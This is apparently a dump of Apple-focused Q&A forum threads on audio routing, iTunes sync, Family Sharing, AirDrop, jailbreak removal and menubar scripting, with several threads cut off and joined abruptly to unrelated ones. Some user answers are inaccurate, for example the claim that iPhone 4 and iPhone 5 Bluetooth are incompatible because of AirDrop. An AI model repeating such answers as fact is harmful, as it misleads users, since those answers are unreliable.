828 Mk1\n\nA: User Carmine Paulino's fix on Github solved the issue. Found it via his answer on another question. His update also adds a few nice UI elements to the Soundflowerbed dropdown, shown below.\n\nIt still clicks briefly when waking from sleep if there is audio playing, but that gets resolved without any work on my part. Great success!\n\nA: Glad it's working for you! Soundflower 1.6.7 changes nothing on my system though. \nI might have to force rebuilding kernel extensions though, I recently read that occasionally old extensions don't unload properly when you update them.\n\nA: I'm having exactly the problem described above - with Yosemite, all the latest versions of everything, 64 bit mode, 2048 frames, etc.  I've tired every fix, messed with all the parameters, and still a persistent clicking noise and overloads from AU Lab - even when running no other applications AND no effects or plugins at all.  Just running audio though SoundFlower -> AU Lab messes it up.\nSo, I guessing, something deeply wrong in CoreAudio.  Very frustrating as I put a lot of time into RTA EQ profiles using AU Lab.\nMy work-around for the moment is to use Adobe Audition for EQ.  Run audio through a dummy multi-track session, monitor a stereo track, and use an EQ Effect. Overkill, but it works well - and you can play adjust the wet/dry mix which is nice.\n\nA: I turned down the output volume in system preferences, then increased the volume on my external amp.... this solved the issue for me. ^_^\n", "Q: In-store iPhone 5 battery replacement? I have an iPhone 5 that's eligible for Apple's battery replacement program. I haven't actually had any trouble with it, but I suppose I should take advantage of the offer before it expires. There are two Apple stores in the area, so I'd prefer to take the phone to one of them. But the web page doesn't actually say whether battery replacements are done on site or how long the process takes.\nWhat should I expect here? Would Apple replace the battery while I wait? Would they ask me to leave the phone a few hours or overnight? I don't imagine they'd swap it for another phone, if only because they wouldn't have the original iPhone 5 in stock at this point.\n\nA: I had a battery replaced on the day after iPhone 6 launch and the process took 50 minutes door to door. (Entering the store to leaving). We did have a reservation and chose to stay past the \"50 minutes\" to let the iCloud restore finish and get key apps from the in store cache / fast internet. \nI would expect you might get in and out 10 minutes quicker on a less busy day and could wait twice that if several phones were ahead of you to have batteries replaced. \n", "Q: How to uninstall Git?

The songs appear to be on the phone, the playlist has items, even album artwork. It seems all the metadata is still there.  Just the actual songs are missing. Trying to play most anything just fails with a missing song icon on the device as it quickly skips most files in the playlist. Files from iTunes itself do have the files deleted from the device, but then these are streamable files, so I actually get to play something as they stream from iTunes. The iTunes bought files still show up as not on the device though.\nAnother, probably related, oddity is the total unreliability of the free space indicator in iTunes.  I can delete playlists from the sync, and free space goes down. I have the same rough group of playlists selected for sync, and free space varies by as much as +/- 4Gb.\nSo, most playlists lose all songs from device, and only streamable songs (read: bought from iTunes) get played.  Individual Manually Added Songs are lost as well.  To fix this, besides the turning on and off of music sync, on and off of playlists to sync, I tried a device restore, and it helped on the one sync, now the files are gone again.  The upgrade to 8.0.2 didn't do much (thought helped battery life a bit).\n5s + 8.0.2, Mavericks + iTunes 11.4\n\nA: I had this problem and was able to resolve it by following the clues here:\nhttp://robservatory.com/a-nasty-little-itunesios-bug-may-be-causing-media-sync-issues/\nApparently it's a bug triggered by duplicates in the iTunes Library.  In my case, I had a couple of duplicates that I wasn't aware of from several years ago.\nI used the \"Dupin\" utility to find the duplicates.  I eliminated the extra copies.  I then turned off \"Sync Music\" in iTunes and did a sync.  There was still some remnant music, so I went into Settings on the iPhone, then General > Usage > Manage Storage > Music.  Click Edit and delete All Songs.  The Settings app will probably crash but the music will be gone finally.  Verify this in the Music app.  Then turn on \"Sync Music\" in iTunes and resync.\n\nA: I had the same problem on my iPhone 6 Plus running iOS 8.1 using iTunes 12.0.1.26 64-bit.\nFollowing the advise of the accepted solution here resolved my issue: https://discussions.apple.com/thread/6545479\n\n\n*\n\n*On the device:\n1a. Open the \"Settings\" app\n1b. Tap on \"General\"\n1c. Tap on \"Usage\"\n1d. Tap on \"Manage Storage\" under \"Storage\" (not \"iCloud\")\n1e. Tap on \"Music\"\n1f. Tap on \"Edit\"\n1g.

It was as @BillLipa said; a duplication of purchased songs (to add insult, it was the damn U2 album that somehow got downloaded twice).\nMy thing to add:\nI didn't feel like paying for a de-dup tool, since the only reason i needed it was because of an Apple bug.  So, I went into iTunes, looked at my device, and specifically music on my phone.  Most songs were marked as missing, the only ones on the device were some of the purchased ones.  I don't have a lot of purchased, so it was quick to track down what was both purchased and on the phone, and if it had a double.  Six songs down the list was U2.  Grrr... delete and resync.

This is normal to do, but for you want that this organize the local files in the pc you need to go to the preferences and enable the option to keep your directory organized! :)\n\nA: I figured it out... Since my PC was the first one to enable and upload songs to iTunes Match I had to organize them on my PC myself.

It would connect at home, but not at work or at Starbucks. After some investigation I discovered I had somehow assigned it a static IP in my Network Preferences (although I have no recollection of doing that LOL). To see if that is the issue Open Network Preferences, click Advanced, click the TCP/IP tab, and ensure the Configure IPv4 dropdown is set to Using DHCP, and click OK.

Can anyone confirm if everyone has this new app, and if there's any way of deleting it?\n\nA: Yes, everyone who upgraded to iOS 8 do have the \"Tips\" app. I have an iPad 2 and it also has \"Tips\". It's shipping with every build of iOS 8.\nSadly, you can't get rid of it unless you jailbreak your device. \n\nA: It's part of the iOS 8 update so everyone has it and, unless/until someone like the developer of iOS6's HideApps creates an updated version, you will have to wait for a jailbreak or downgrade to iOS7 while you still can to get rid of it.\n", "Q: How to disable recycle bin (Recently Deleted) of iOS 8 Photos app?

After you install and respring your device, the photos you delete will no longer go into the \"Recently Deleted\" album in your photos app, and will instead be deleted from the device, as they were previously in iOS.  \nAs of now, the tweak does not fully remove the \"Recently Deleted\" items album in the photos app, and it will still show there.  The author of the tweak plans on updating it in the near future, so the album is removed as well.\nI hope this helps ;)  \n-James\n", "Q: How can I see all apps in 'Essentials' in Mac and iTunes app stores? A quick question: While navigating the Mac and iOS appstores, I often see some apps marked with a grey rectangular box with rounded edges called 'Essentials', which appears just below the rating of the app. The selection of apps marked in this ways seems quite well thought-out to me. Is there a way to see all these 'Essential' apps in one place?\nFor example, 'Day One', 'Evernote' and 'WolframAlpha' are all 'Essential' apps in the iOS store.\n\nA: After a bit of research (in the stores themselves, using Google, and in the Apple Developer Program resources), I'm rather sure no list of these is available from Apple themselves or from any third party.\nI found the best ways to find the apps tagged as \"Essentials,\" is to look in these places:\n\n\n*\n\n*Both the Mac App Store and the iTunes App Store have a link on their front page called \"New to the (Mac) App Store?\" Most apps listed there, which are not games, have the \"Essentials\" badge. It's not the way to find them all though, as e.g. the WolframAlpha app you mentioned is not listed on that page in the iTunes Store. There are also some apps which don't have the badge, e.g. Shazam is tagged as \"Editors' Choice,\" but not \"Essentials\" in the Mac App Store.\n\n*The iTunes App Store also has a link \"App Collections.\" Although the page this link leads to is titled \"Essentials App Collections,\" quite a number of the apps listed in the collections don't have the \"Essentials\" badge. On the other hand, you can find a lot of \"Essentials\" this way.\n\n\nMy impression is the difference between the \"Essentials\" tag and e.g. \"Editors' Choice\" is not very well defined, and just picked by a specific Apple store editor. And I noticed some of those apps may be only essential to a very specific crowd. E.g. the djay 2 app, also tagged \"Essentials,\" is most definitely the best and most popular DJ app for the iPad out there, but it's only essential to a select group.\nIn the end, although there is no definitive list, going though the various collections made by Apple editors, will lead you to a lot of \"Essential\" apps.\n\nA: There is a yellow banner named Essentials in the App Store in the Featured tab. This week it's in the 4th row, between Best New Games and Best new games Updates. \n\nA: You can find all the apps labeled essentials in the Featured tab in App Store. It's listed in between the Best New Games and Popular Apps & Games, next to Editor's Choice. \nIt seems that Apple will pick one app in its category as an Essential. \n\nA: Search on App Store for Apple \n.....\n", "Q: Issue with using Netgear AC1600's 802.11ac standard and WMM on 2014 MBP When I enable the WMM (Wireless Multimedia) setting, which allows the full bandwidth of ac, and the computer is for instance streaming online video, or video over ip within a browser like a chatroom, I am unable to open another page on the same computer. The browser is academic, including if I try to use a different browser for each. The source of the video does not influence the performance either. I will try to resolve another webpage, which this page doesn't matter except that smaller pages are more likely to go through, but not by much. Sometimes trying over and over again will yield a result, other times not. I have played with the QoS settings to no avail, and turning off the WMM uses the 802.11a standard only and connects at 54 Mbps. Any ideas as to why this is happening and how to fix it?\nMy wifi scans read the width as such: 20 MHz for 5 GHz and 20 MHz for 2.4 GHz with WMM disabled, and 80 MHz for 5GHz and 40 MHz for 2.4 GHz. This problem only occurs on my MacbookPro 11,3 15 in Retina, as it is the only computer on my network that uses 802.11ac, and while it is happening on my MBP I can load a webpage on my iPhone, or another computer just fine.\n\nA: The problem has resolved itself with the update to OS X Yosemite. It must have been a Mavericks issue. I have done nothing to the routers settings prior, and have since been able to enable WMM settings.\n", "Q: iTunes shows many of my apps with \"Update\" but when I synch nothing happens I have an iPod with iOS 6 (the latest it will support). iTunes shows many of my apps with \"Update\" but when I synch nothing happens.\nI presume the Updates are not compatible with iOS 6. How do I stop this, and how to distinguish from real updates\n\nA: The iPod you are using (presumably the iPod 4) is no longer taken into consideration when new apps are being developed, nor is the operating system on it as both of these are obselete. This is the reason nothing happens when you sync your iPod. However iTunes just thinks that an app you are using is out of date and should be updated, without considering the device attached. So there is probably no way to single out the incompatible updates.\nHope I helped!\n", "Q: iOS 8 and problems with iWork's accessing iCloud I upgraded my iPad 3 to iOS 8.

All the guides I have found talk about how to uninstall it from various PC OS versions, but don't mention Mac.\nAt the moment there is one extension which shows up under Firefox on her account only: \"Shopping Helper Pro 0.95.29\", as well as a plug-in \"Coupons Inc., Coupon Printing Plugin 1.1.0\" which (for some reason) shows up both on her account and mine as well.\nThe problem is, I have disabled both of them in Firefox, but I cannot figure out how to actually install them.  Supposedly an extension should have a \"Remove\" button\" to uninstall it, but no such button appears.  Plug-ins are said to have their own uninstallers, but I can't find one anywhere.\nI am also concerned about whether these unwanted programs have confined themselves to just Firefox, or could be lurking in other places.\nHow can I completely remove all traces of both of these, or in general any kind of mistakenly installed (b)adware?

The dialog allows me to select a photo, move it, resize it.\nOnce I have selected and confirmed the photo I want to use, is there a way to change the photo again? Holding a finger on the photo doesn't have any effect. I haven't found a way to reset or change the photo.\nIs that something that Apple has not thought about, or am I simply missing something?\n\nA: Settings > iCloud > tap the You line at the top > Edit > edit (under photo)\n\nA: The picture that you have in your family sharing is the picture that each family member chooses as the \"me\" in their contact information.  If you have Facebook on your contact information it may use your Facebook profile picture unless you edit it to another picture.  To set your \"me\" on iPhone or iPod touch go to Settings>Mail,Contacts,Calendars>My Info(under Contacts) and choose the contact to represent you.  Any time you go into that particular contact and edit the picture it will change the picture for you on the family sharing.  The same is true for any other family member.\n", "Q: Does iTunes Match work with iOS8 Family Sharing? Since I currently don't use iTunes Match, but have started to use the new iOS8 Family Sharing feature to share app and music purchases with the rest of my family, I'm curious to see whether Family Sharing also shares the iTunes Match content with the rest of the family.\nDoes data from one family member's iTunes Match account show up for other family members that are part of the same Family Sharing group?\n\nA: No. This Apple support document details what can and cannot be shared with family sharing. In particular, there is a list of items that cannot be shared:\n\nThere are a few things that you can't share:\n  \n  \n*\n  \n*Songs added to iTunes Match from outside the iTunes Store\n  \n*In-App Purchases\n  \n*Items that are no longer available on the iTunes Store\n  \n*Items that were hidden\n  \n*Apps that aren't shareable\n  \n\nWe still don't know how many apps will opt-out of being shareable. So this \"few things\" could end up being many things.\nYou could alternately describe the above list as Things That Can Be Shared Only With a shared iTunes Account.\nSo if you want maximum media sharing between adults, but still want to use Family Sharing for restricting children and/or for its non-media features (photo sharing, location sharing, calendars, etc.), then the best compromise seems to be:\n\n\n*\n\n*Define one Apple ID (the \"ownership ID\") to be used only for media purchases, for iTunes Match, etc.. Adults use this Apple ID only for logging into the iTunes Store and the App Store.\n\n*Create an individual personal Apple ID for every adult and child. Everyone uses their personal ID for iCloud, Messages, and other personal services.\n\n*If you want to restrict children, then children also use their personal accounts for iTunes (which means they don't get iTunes Match and other non-shareable media, but they do get restricted sharing and purchasing via Family Sharing)\n\n*The ownership account or an adult's personal account configures itself as the family organizer, and invites all the other accounts to the family.\nI believe this configuration achieves the following effect:\n\n\n*\n\n*Adults get unrestricted sharing via logging into iTunes with the ownership account\n\n*Children can get restricted sharing/purchasing via Family sharing\n\n*Everyone gets private messaging and doc-sharing via their personal IDs\n\n*Future purchases by adults are owned by the ownership account, diminishing fragmentation (unlike purchases by children, which will be owned by the child's account, paid for by the ownership account, and shareable only as far as allowed by family sharing)\n\n\nHow to decide whether to use the ownership account or an adult personal ID to be the family organizer? I don't know. It seems pretty equivalent to me. One difference is that, if you use an adult personal account as the family organizer, then you have to duplicate payment information in the ownership account and in that individual's personal account. \n\nA: No. Each family member would have to use purchases in the cloud to download your entire music library. \nI know of several people that tried family sharing and I've gone back to one Apple ID because of how well iTunes match works for them. Losing that feature to gain the rest wasn't worth it in the short run.\nMy gut feeling is that sharing between two adults it's better to stick with one Apple ID and families with small children will prefer a family sharing in the 8.0 incarnation of the feature\n\nA: There is a solution for this.  I just spent 2 hours on the phone with Apple today, June 10, 2015.  It requires using 2 Apple ID's on the secondary phone(s).  I was going to go into detail and attempt to answer this to help others to avoid the problems that I had.  When I went to the other thread that I had not read far enough down, I found a link that explains it better than I ever could.

When using the new iOS8 Family Sharing feature, I can download the apps purchased by the other group members of my family. \nIf these apps use In-App Purchases, and one of the family members has already purchased some content, e.g. a new guitar amp for the JamUp Pro XT guitar/bass amp simulator, do other members of the family get to benefit from these In-App Purchases? Or does every family member have to purchase the same content in the app again?\n\nA: Apple does not include In-App purchases on their site, meaning they are not included. If In-App purchases would be shared, it would have been stated there very clearly.\n\nOnce you set up Family Sharing, family members get immediate access to\n  each other’s music, movies, TV shows, books, and apps.\n\nYou can see the official page here.\nPersonal note: I don't see In-App purchases being shared soon or in the near future as they include lifes for games for example.\n\nA: In App purchases are not shared in Family sharing and its clearly given in apple website.

I gave in and decided to buy it and, only after I agreed to it, a message box came up and said, \"You've already purchased this.  Would you like to get it again for free?\" so I was able to get it on both devices only paying for it once.  But I never would have tried that route if I hadn't broken down and decided to just purchase it again.  Maybe you'll be pleasantly surprised but you have to take a risk. \n", "Q: Flickering external monitor w/ MBP retina 13\" I use the latest 13\" MBP retina and I wanted to use an external display (LG IPS231) through hdmi but the LG doesn't have an HDMI port. \nSo, I plugged the HDMI cable into my laptop to an HDMI to DVI adapter which I, then, plug into the screen. That doesn't work. Both screens flicker when I plug and unplug the monitor and the MBP recognises the screen and its resolution. On the other hand, the monitor shows the no signal screen.\nI don't have another monitor or other computer to test right now.\nI included a picture, not sure if it's super helpful.\n\nThanks in advance if anyone helps!\n\nA: All I can really suggest is that you purchase a Mini DisplayPort to VGA Adapter, along with a VGA cable (D-Sub cable), and use that with your MacBook Pro.\n(the blue socket beneath the DVI socket is the VGA socket.)\n", "Q: Why do we need a motion coprocessor? Apple talks about the M7 and M8 motion coprocessors for the iPhone pedometer and other operations. \nMy question is Why do we need a motion coprocessor? Surely this is just digital signal processing that the massively powerful primary processor can handle?\n\nA: There are a few reasons why having a separate processor is appropriate for this.\nThe processor is for tasks that can be run all of the time, whether you're doing something with your device or not.\nThe tasks it's being asked to do are of critical priority, but likely require very little actual processing.\nDevice Usability:\nBy splitting this work to a separate processor, it means that developers don't have to concern themselves about how much of the main processor is being used. The main processor can be unused or maxed out, and it will have no impact on the processing of tasks that the motion coprocessor takes on.\nIn effect, it means that your normal device usage and the background motion processing will never interfere with each other.\nPower Usage:\nSince these tasks are being run continuously, putting them on a separate low-power processor also allows for the device to use less power. With battery life being a very large concern for a lot of users, Apple thought it was necessary to consider the power usage for always on functions.\nThese functions can also be implemented in a much more optimal way on a processor that has a very specific task. Consider this similar to how a GPU is able to process much more than a CPU (in most cases) because it's targeted for a specific task.\n\nA: You have implied the reason in \"the massively powerful primary processor\". It takes electrical power to run the computer processing. Thus, if you need something to be on all the time, you want a smaller processor than the main one to save battery power.\n\nA: The first thing I noticed the first time I opened Nike+ Move on my iPhone 5s was that it immediately had data for the previous two weeks or so. I believe the motion coprocessor efficiently constantly tracks and records your movement sensor data and gives apps access to that data. This allows apps to collect this data even when not open without having to run constantly in the background. The processing difference between only collecting motion data (and doing so in a single unified place for all apps) and running an entire app in the background is enormous in terms of battery usage. \n", "Q: When I download apps it says I need a 64-bit processor I have a Snow Leopard OS X 10.6.8 and I cannot download apps. When I try to, it says 'this requires a 64-bit processor' (or something like that) and my processor is 32-bit. Does this mean that I'll never be able to download apps on my Mac? Is there a way to change the processor to 64-bit?\n\nA: If your Mac allows you to replace the CPU then you could possibly buy a 64-bit processor and upgrade just that one part. Without changing that there's no practical way to run a 64-bit application on a 32-bit machine. \nIn the short term you'll have to find applications to download that running 32-bit environments or replace/upgrade your Mac.\n", "Q: iTunes stops working every time I launch it Recently I've updated my iTunes to the latest version, 11.4.0.18. Prior to updating it, iTunes didn't stop working, neither did it have any problems. Only after I updated it to the latest version, the dialog box will come up with \"iTunes has stopped working\" every time iTunes is launched.\nEdit:\nI'm running on Windows 8.1, 64-bit. The user profile I'm using is an Administrator account.\n\nA: That version of iTunes is for Microsoft Windows.\nI suggest that you follow the instructions in this Apple troubleshooting article.\n\nA: I solved it by uninstalling my current itunes and all its related programs. And then install the previous itunes version.\nIt worked instantly for me.\n\nA: I have same problem after upgraded to iTunes 12.7 and there is no useful solution. If you disconnect from network itunes works fine.\nYou can try safe mode\nhold ShiftControl and double click iTunes.

I opened all my internet audio streams in iTunes and copied all of them into an iTunes playlist.\nI would like to sync this playlist with the one on my iPad iTunes but I can't. When I select my iPad from iTunes this playlist is missing from the playlists.\n\n\nA: The Music app on iOS doesn't support Audio streams. If you want to listen to audio streams on iPhone/iPad you can use one of the various streaming apps available in the App Store (e.g. WunderRadio, TUneIn Radio or Radium).\n", "Q: iMessage on old iPhone So in the past few days I just retired my old iPhone 5 and upgraded to the new iPhone 6.\nOnce I took the SIM out, I expected just standard carrier calls and texts to stop working (for obvious reasons) but for some reason all forms of iMessage seem to have stopped working too.\nFor many reasons I intend on still using the iPhone 5 without a SIM so is they're any reason as to why iMessage stopped working? I thought it would have assumed the functionality of what would essentially be a very large iPod touch.\nEnabling and disabling it in settings hasn't done much, yet it is activated successfully upon turning it on. I don't receive messages anymore and sending messages causes it to instantly fail.\n\nA: This seems to be related to Apple's attempt to make it so that if you are moving from iOS to Android other iOS users can still message you as your iMessage will be disabled.\nI managed to get a friend's phone to work by sending him an iMessage to his Apple ID. This seemed to fix it and now he can send/receive messages with others too.\n\nA: During the 8.0.2 iOS uodate, for some unknown reason my iPhone 5 got sent into recovery mode and I was forced to restore it from a backup since nothing I tried could get it out of recovery mode.\nAfter restoring the phone, iMessage seemed to work once again allowing me to use the phone number as a means of communication and set it as the default.\nMaybe this is because when getting the phone out of recovery, before I could restore I had to insert my sim from my iPhone 6 inside it to activate the phone. Maybe this had something to do with it. A message also appeared on my iPhone 6 and Mac when iMessage started working so perhaps that had something to do with it.\nAnyway, it works! :)\n", "Q: Why are iPhone4 and iPhone5 (iOS 7) not recognizing bluetooth devices? when I go to Settings -> Bluetooth and turn it on, devices (both iPhone 4 and 5, iOS7) start searching for devices with bluetooth, but never find anything. On the other hand, when I search from Android, iPhones are always found and can be paired, but sometimes not connected because of not supporting some devices (for iPhone 4 is written for me that Xperia Z2 is not supported). \nThe problem is that I'm trying to discover nearby beacon, but as I've said, I cannot discover anything with iPhones. Android discovers it without problem. \nHow can I solve it, so my devices find surrounding devices sending bluetooth signals?\n\nA: iPhone 4 has bluetooth whereas iPhone 5 has AirDrop. So they are not compatible with each other. \nThat is answer to a part of your question that iPhone doesn't recognise other iPhone (5 and 4).\n\nA: Different smartphones have different Bluetooth versions depending on when they were made.\nYour Xperia Z2 has Bluetooth 4.0, which has something called Bluetooth Low Energy, which is used to communicate between devices.\niPhone 4's (not iPhone 4S') have Bluetooth 2.1 and don't support this.\niPhone 4S' and above on the other hand have Bluetooth 4.0 and can hence detect the other smartphones.\nThis is hence the reason why AirDrop is only supported on iPhone 4S' and above.\nAdditionally this is also the reason why on your iPhone 4 you can't see your other iPhones and phones that don't have a Bluetooth version of 4.0 or higher.\n", "Q: Number in brackets appended to Apple TV Bonjour name I recently set up a 3rd-generation Apple TV in my living room. I have noticed that on my OS X 10.10 MacBook Pro an iPad and two iPhones (all iOS 7), the usual name of \"Living Room Apple TV\" appears with a \"(2)\" appended at the end.\nAfter reading suggestions elsewhere, I have assigned a fixed IP address for the Apple TV and restarted the router in charge of DHCP assignments for the network. The issue persists if I change the name of the Apple TV.\nAttached is anything relevant to the Apple TV in Bonjour Browser:\n\n\nA: The quickest way to fix this issue is to add a simple space to the end of the name of the Apple TV. Restart the device and it will now show up without the bracketted number appended. My guess is that the Space acts like a wild card in the Bonjour Log and won't treat each instance of the apple TV as another instant of the last. \n", "Q: Wifi Connection Problems I'm having a WiFi sharing problem. \nI'm using my ipad air as a hotspot for my mac osx leporad (which has a airport card).

Also I have a Mac OS X 10.5 \nThankx\n\nA: To set up a hot spot on your iPad, start by opening Settings and navigating to General > Network. (Note: you will need to have the Cellular Data connection turned on.)\nYou can set up your personal hot spot by tapping on the giant setup button, which will check with your carrier to see if the feature is supported, and if it is, allow you to turn the hot spot on. If your carrier doesn't support it, you'll get an alert telling you as much. \nEnter a password that has to be minimum 8 characters long.\n", "Q: How to remove evasi0n 7 jailbreak on ip4 iOS 7.0.4? I jailbroke my iPhone 4 iOS 7.0.4 (11B554a) with evasi0n 7. And that's the worse I did with my phone. I am new to iPhone and was just curious about jailbreaking. But that jailbreak corrupted many of my apps including iOS own apps.\nI am very very happy with iPhone in its default iOS. I want to restore back to 7.0.4. \nP.S: I tried \"Erase all data and settings restore\" from iPhone settings but the process stucks at spinning wheel after restart.\n\n#\n\nUpdate::\nOk. I did that. I downloaded ipsw of iOS 7.0.4 and tried to install it through shift+restore method through iTunes. But it keeps giving me error 21 again and again. And don't know about it.\n\nA: Attempting to reset your jailbroken phone from your phone will break everything. You'll need to put your device in DFU mode and restore it with iTunes. Connect your device to iTunes, then hold the power and home button until the Apple logo shows, then keep holding home and let go of power. iTunes should prompt you to restore iOS.\n", "Q: AirDrop: Bluetooth or Wi-Fi? How does AirDrop work? I thought it is just Bluetooth, but I am starting to doubt that now.\nWhenever I turn AirDrop on, my Wi-Fi and Bluetooth are automatically turned on. If I turn the Wi-Fi off, and try to AirDrop, sometimes it works, but sometimes it doesn't. It never works if I turn the Bluetooth off instead.\nSo... Why does this happen? How does AirDrop work?\n\nA: Bluetooth LE is used for local discovery of other Airdroppers and WiFi direct is used for transmitting anything of meaningful size since it has a MUCH faster xfer rate.\nAnd here's a longer version of that explanation.\n\nA: AirDrop uses Bluetooth to create a peer-to-peer Wi-Fi network between the devices.\nEach device creates a firewall around the connection and files are sent encrypted, which actually makes it safer than transferring via email. AirDrop will automatically detect nearby supported devices, and the devices only need to be close enough to establish a good Wi-Fi connection, making it possible to share files across several rooms.\n\nA: There's a way to use Airdrop without Wi-fi connection\nThere's a way to bring back the \"Airdrop\" to Finder again even that you just in Ethernet/LAN connection. Simply run the command terminal below: \ndefaults write com.apple.NetworkBrowser BrowseAllInterfaces 1 \n\n\nA: The more detailed, and technical version of @Buscar웃's answer, from Apples iOS Security Guide (2018) Page 40, bolded by me:\n\niOS devices that support AirDrop use Bluetooth Low Energy (BLE) and\n  Apple-created peer-to-peer Wi-Fi technology to send files and\n  information to nearby devices, including AirDrop-capable Mac computers\n  running OS X 10.11 or later. The Wi-Fi radio is used to communicate\n  directly between devices without using any Internet connection or\n  Wi-Fi Access Point.   When a user enables AirDrop, a 2048-bit RSA\n  identity is stored on the device. Additionally, an AirDrop identity\n  hash is created based on the email addresses and phone numbers\n  associated with the user’s Apple ID.\nWhen a user chooses AirDrop as the method for sharing an item, the\n  device emits an AirDrop signal over Bluetooth Low Energy. Other\n  devices that are awake, in close proximity, and have AirDrop turned on\n  detect the signal and respond with a shortened version of their\n  owner’s identity hash.\nAirDrop is set to share with Contacts Only by default. Users can also\n  choose to use AirDrop to share with everyone, or turn off the feature\n  entirely. In Contacts Only mode, the received identity hashes are\n  compared with hashes of people in the initiator’s Contacts app. If a\n  match is found, the sending device creates a peer-to-peer Wi-Fi\n  network and advertises an AirDrop connection using Bonjour. Using this\n  connection, the receiving devices send their full identity hashes to\n  the initiator. If the full hash still matches Contacts, the\n  recipient’s first name and photo (if present in Contacts) are\n  displayed in the AirDrop share sheet.\nWhen using AirDrop, the sending user selects who they want to share\n  with. The sending device initiates an encrypted (TLS) connection with\n  the receiving device, which exchanges their iCloud identity\n  certificates. The identity in the certificates is verified against\n  each user’s Contacts app. Then the receiving user is asked to accept\n  the incoming transfer from the identified person or device. If\n  multiple recipients have been selected, this process is repeated for\n  each destination.\nIn the Everyone mode, the same process is used but if a match in\n  Contacts isn’t found, the receiving devices are shown in the AirDrop\n  send sheet with a silhouette with the device’s name, as defined in\n  Settings > General > About > Name.\nOrganizations can restrict the use of AirDrop for devices or apps\n  being managed by using an MDM solution.\n\n\nA: It uses Bluetooth to locate the Air Drop enabled device & create device to device Wi-Fi link (Wi-Fi Direct) to transfer files\n\nA: As others have pointed out, AirDrop creates a temporary point-to-point Wi-Fi connection between the two devices, which is why Wi-Fi must be enabled to use it.\nBut, and this is an important point, your computer does not need to be connected to any Wi-Fi access point.\nIn my case, my Mac is connected to my home network via Ethernet.  I have the Wi-Fi interface enabled, but I've deliberately disconnected it from all access points.  To do this:\n\n*\n\n*In the Network settings, uncheck \"Automatically join this network\", so it won't reconnect after a restart.\n\n*You might also want to uncheck \"Ask to join Personal Hotspots\"\n\n*If you are connected to a network, option-click the Wi-Fi icon in the menu bar and then click \"Disconnect from your_SSID\" to disconnect.\n\nAt this point, Wi-Fi is on, but it is not connected to any access point and will therefore not be used for LAN communication.  But the Mac will be able to use it to create the point-to-point connection used by AirDrop.\n\nA: As mentioned AirDrop uses both Bluetooth and Wi-Fi but it has now been reverse engineered and is available in an open source implementation, OpenDrop, as part of the Open Wireless Link Project.\n", "Q: screensaver that takes a screenshot I'd like to make my screensaver look just like an unlocked desktop.\nThe idea would be to take a screenshot just before activating the screensaver, and use that screenshot in the screensaver.\nHas anyone done this before?\n\nA: You can use ScriptSaver.\n\n\n*\n\n*Set the AppleScript to a script containing the following:\ndo shell script \"/usr/sbin/screencapture /path/to/folder/screensaver.png\"\n\n/path/to/folder must exist and be empty, or at least contain no other images\n\n*Set the screen saver to display after the AppleScript to Classic.\n\n*In System Preferences, set the folder for the Classic screensaver to the /path/to/folder.\n\nA: If you do find a screensaver that can play different images on each display.

The first character indicates the run state of the process:\n\n           I       Marks a process that is idle (sleeping for longer than about 20 seconds).\n           R       Marks a runnable process.\n           S       Marks a process that is sleeping for less than about 20 seconds.\n           T       Marks a stopped process.\n           U       Marks a process in uninterruptible wait.\n           Z       Marks a dead process (a ``zombie'').\n\n           Additional characters after these, if any, indicate additional state information:\n\n           +       The process is in the foreground process group of its control terminal.\n           <       The process has raised CPU scheduling priority.\n           >       The process has specified a soft limit on memory requirements and is currently exceeding that limit; such a process is (necessarily) not swapped.\n           A       the process has asked for random page replacement (VA_ANOM, from vadvise(2), for example, lisp(1) in a garbage collect).\n           E       The process is trying to exit.\n           L       The process has pages locked in core (for example, for raw I/O).\n           N       The process has reduced CPU scheduling priority (see setpriority(2)).\n           S       The process has asked for FIFO page replacement (VA_SEQL, from vadvise(2), for example, a large image processing program using virtual memory to sequentially\n                   address voluminous data).\n           s       The process is a session leader.\n           V       The process is suspended during a vfork(2).\n           W       The process is swapped out.\n           X       The process is being traced or debugged.\n\n\nA: OS X also has the top command.

But I don't have the sim for this American phone number, and my iPhone has a sim with a local number from the Middle East installed to it.\n\nA: I've had good luck with Acrobits Softphone... it's a SIP soft phone for iOS.  Once you have an appropriate VoIP/PBX account that supports SIP clients, you can use google chat to get your calls into the PBX.\nIt definitely has some noticeable lag, but it is certainly better than nothing.  \nYou can get a free VoIP/PBX account at pbxes.com (I have no affiliation).\n", "Q: How to make your email signature work well with iOS 8 data detectors in mail? I have noticed that with iOS 8, that some mails come up with the 'contact information' at the top of the mail.

Basically I want to issue a command in a bash script or an Apple Script\nand see some string (or icon) in the status bar aka \"where the clock is\".\nSomething similar to osascript but for the status bar:\n/usr/bin/osascript -e 'display notification \"Lorem ipsum dolor sit amet\" with title \"Title\"'\n\nA: This is something that I looked for a long time ago and did not find a satisfactory solution to. Your question has inspired me to finish the project that I began back when I was searching for a solution to this.\nCheck out menubarnotifier on GitHub. You can display a notification in the menubar by passing a string to the script:\n./menubarnotifier.py \"Notification Text Here\"\n...and it will display in the OS X menubar. Clicking the notification will exit the application.\n\nAdd the location of the script to your path (or just create an alias to the script itself) and you will be able to use it from anywhere in the Terminal.\nThe problem with the existing implementation is that it logs using NSLog, which writes to stderr by default. You will need to suppress the NSLog messages to get any real use out of the script.\nMy approach is to add the following function to your ~/.bash_profile and then call the function when you want to add a notification to the menubar:\n# menubarnotifier.py function\nmn () {\n    /path/to/menubarnotifier.py \"$1\" 2>/dev/null &\n}\n\nSo you can use it with just:\nmn \"Notification Text Here\"\n\nAnd it will not log to stdout. It will also run in the background to not require Ctrl+C.\n\nThe script uses PyObjC, so you will need to install that if you don't have it already. I installed it using MacPorts easily with sudo port install py27-pyobjc* but I think you can get away with just sudo port install py27-pyobjc py27-pyobjc-cocoa.\nThe idea is to use NSStatusBar.systemStatusBar().statusItemWithLength_() to create a new item in the OS X menubar. \nself.statusItem = NSStatusBar.systemStatusBar().statusItemWithLength_(NSVariableStatusItemLength)\nself.statusItem.setTitle_(display_text)\n\n\nI'll add more functionality later (such as images like you mentioned in your question). I also need to figure out a better logging mechanism so you can just run it and not see the NSLog output. For now, use the bash function that I wrote above to get this to operate the way you want it to.\n", "Q: How to repair time machine after it loses its history I'm running Mavericks 10.9.4 on a MacBook Pro.

